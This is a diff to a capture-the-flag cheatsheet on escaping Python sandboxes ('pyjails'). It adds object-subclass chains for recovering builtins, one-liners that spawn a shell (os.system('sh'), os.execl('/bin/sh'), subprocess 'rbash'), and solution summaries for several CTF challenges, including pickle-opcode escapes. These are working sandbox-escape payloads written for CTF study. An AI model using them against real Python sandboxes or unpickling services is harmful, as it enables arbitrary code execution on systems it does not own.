@@ -7,6 +7,7 @@ This document provides a comprehensive collection of Python jail escape techniqu
 - [Pyjail Cheatsheet](https://shirajuki.js.org/blog/pyjail-cheatsheet/)
 - [Pyjail collection](https://github.com/jailctf/pyjail-collection)
 - [A collection of pyjails](https://github.com/salvatore-abello/pyjail/tree/main)
+- [Pyjail cheatsheet](https://github.com/salvatore-abello/python-ctf-cheatsheet/blob/main/pyjails/README.md)
 
 ## Quick Reference Cheatsheet
 
@@ -36,24 +37,31 @@ Use Unicode characters that look like ASCII but bypass filters. See [details](./
 
 ### Accessing Builtins When Banned
 
-- `().__class__.__base__.__subclasses__()`
-- `().__class__.__mro__[1].__subclasses__()`
-- `().__setattr__.__objclass__.__subclasses__()`
+Use [automated script](./find_chains.py) to find chains:
 
-When `__import__` is available:
-
-- `().__reduce_ex__(2)[0].__builtins__`
-- `().__reduce_ex__(2)[0].__globals__["__builtins__"]`
-
-When you have access to exception:
-
-```python
-try:
-    1/0
-except Exception as e:
-    print(e.__traceback__.tb_frame.f_builtins)
-    print(e.__traceback__.tb_frame.f_globals["__builtins__"])
-```
+- Get subclasses of object, then get builtins via e.g. `().__class__.__base__.__subclasses__()[os_wrap_close_index].__init__.__globals__["__builtins__"]`:
+    - `().__class__.__base__.__subclasses__()`
+    - `().__class__.__mro__[1].__subclasses__()` or `().__class__.__mro__.__getitem__(1).__subclasses__()`
+    - `().__setattr__.__objclass__.__subclasses__()`
+- Find via `class.*.__globals__`:
+    - `().__class__.__subclasses__()[codecs_codecinfo_index].__new__.__globals__["__builtins__"]`
+    - With `import re`:
+        - `''.__class__.__subclasses__()[strenum_index].__dir__.__globals__["__builtins__"]`
+        - `{}.__class__.__subclasses__()[collections_counter_index].__pos__.__globals__["__builtins__"]`
+- Get shell without getting builtins:
+    - `().__class__.__base__.__subclasses__()[os_wrap_close_index].__init__.__globals__["system"]("sh")`, find os_wrap_close_index via `str(().__class__.__base__.__subclasses__()).split(", ").index("<class 'os._wrap_close'>")`
+    - `().__class__.__base__.__subclasses__()[builtinimporter_index].load_module("os").system("sh")`, find builtinimporter_index via `str(().__class__.__base__.__subclasses__()).split(", ").index("<class '_frozen_importlib.BuiltinImporter'>")`
+- When `__import__` is available:
+    - `().__reduce_ex__(2)[0].__builtins__`
+    - `().__reduce_ex__(2)[0].__globals__["__builtins__"]`
+- When you have access to exception:
+    ```python
+    try:
+        1/0
+    except Exception as e:
+        print(e.__traceback__.tb_frame.f_builtins)
+        print(e.__traceback__.tb_frame.f_globals["__builtins__"])
+    ```
 
 ### Numbers and Booleans Without Digits
 
@@ -70,13 +78,31 @@ except Exception as e:
 - `code.interact()`
 - `doctest.debug_script(src)`
 - `os.system("sh")`
+- `os.execl("/bin/sh", "sh")`
 - `pdb.run(src)`
 - `pdb.set_trace()`
+- `pdb.test()`
 - `pydoc.pipe_pager(text, cmd)`
 - `pydoc.tempfile_pager(text, cmd)`
 - `object.__subclasses__()[popen_index](['sh'])` (via `<class 'subprocess.Popen'>`)
 
-## SECCON CTF 14 Final increasing
+## jailCTF 2026 the quasar files
+
+Requirements:
+
+1. No builtins: use `().__class__.__base__.__subclasses__()[os_wrap_close_index].__init__.__globals__["system"]("sh")` to get shell
+2. No `[]"'`: use `__getitem__` and `().__doc__.__getitem__`
+
+Details [here](../2026-07-25-jailctf-2026/the-quasar-files.md).
+
+## jailCTF 2026 collatz
+
+1. No builtins: use `().__class__.__subclasses__()[codecs_codecinfo_index].__new__.__globals__["__builtins__"]["__import__"]("subprocess").check_call("rbash")`
+2. Length of words (`\w+`) conforming to collatz sequence: 9 (`__class__`) -> 28 -> 14 (`__subclasses__`) -> 7 (`__new__`) -> 22 -> 11 (`__globals__`) -> 34 (`__builtins__` with padding) -> 17 (array subscript) -> 52 (`__import__` with padding) -> 26 (array subscript) -> 13 (`subprocess` with padding) -> 40 (array subscript) -> 20 -> 10 (`check_call`) -> 5 (`rbash`), use `[value][0000000]` to handle the rest widths
+
+Details [here](../2026-07-25-jailctf-2026/collatz.md).
+
+## SECCON CTF 14 2026 Final increasing
 
 Requirements:
 
@@ -85,7 +111,7 @@ Requirements:
 
 Details [here](./pyjail/secconctf-14-final-increasing.md).
 
-## hxp 39C3 CTF sponsored
+## hxp 39C3 CTF 2025 sponsored
 
 Requirements:
 
@@ -110,7 +136,7 @@ Requirments:
 
 Details [here](../2025-12-19-hkcert-ctf-2025-quals/easyJail.md).
 
-## SECCON CTF 2025 Quals excepython
+## SECCON CTF 14 2025 Quals excepython
 
 Requirements:
 
@@ -259,7 +285,7 @@ Requirements:
 
 Details [here](./pyjail/uoftctf-2024-jail-zero.md).
 
-## SECCON CTF 2024 Quals 1linepyjail
+## SECCON CTF 13 2024 Quals 1linepyjail
 
 Requirements:
 
@@ -330,6 +356,15 @@ Requirements:
 
 Details [here](./pyjail/tcp1p-ctf-2024-functional.md).
 
+## Dice CTF 2024 Quals unipickle
+
+Requirements:
+
+1. No whitespace (`.split()[0]`): use `STACK_GLOBAL` (no newlines needed)
+2. Valid UTF-8 (`.encode()`): use `BINPUT` to consume leading byte 0xC2 as integer index, then `STACK_GLOBAL` as continuation byte 0x93
+
+Details [here](./pyjail/dicectf-2024-quals-unipickle.md).
+
 ## TCP1P CTF 2023 PyMagic
 
 Requirements:
@@ -341,6 +376,24 @@ Requirements:
 5. No builtins: Use `().__class__.__base__.__subclasses__()`
 
 Details [here](./pyjail/tcp1p-ctf-2023-pymagic.md).
+
+## b01lers CTF 2023 Blacklisted
+
+Requirements:
+
+1. No `.`, `_`, parentheses, brackets, quotes, spaces: use `@f` decorator syntax to call functions and form feed `\x0c` as whitespace
+2. `open`/`print` stripped: use `oopenpen`/`pprintrint`, after stripping only the target word remains
+3. Blacklisted words (`exec`, `import`, `os`, etc.): use `sorted` instead of `list`, or fullwidth NFKC bypass for `exec`
+
+Details [here](./pyjail/b01lers-ctf-2023-blacklisted.md).
+
+## Sekai CTF 2023 just-another-pickle-jail
+
+Requirements:
+
+1. `find_class` limited to `__main__` with substring blacklist, most opcodes disabled: use `BUILD` to overwrite `Unpickler` instance attributes and `BINPERSID`/`NEXT_BUFFER` for arbitrary function calls
+
+Details [here](./pyjail/sekai-ctf-2023-just-another-pickle-jail.md).
 
 ## GDG Algiers 2022 Type_it
 
@@ -359,3 +412,11 @@ Requirements:
 1. Function can only use at most one stack element: use `CALL_FUNCTION` instead of `CALL_METHOD`, i.e. use `B = A.method; C = B()` instead of `A.method()`
 
 Details [here](./pyjail/imaginaryctf-round-23-stackless-jail.md).
+
+## HITCON 2022 picklection
+
+Requirements:
+
+1. Pickle `find_class` limited to `collections` module without `__`: use `collections.namedtuple` where a malicious field name with RCE reaches `eval` as a default argument expression
+
+Details [here](./pyjail/hitcon-2022-picklection.md).
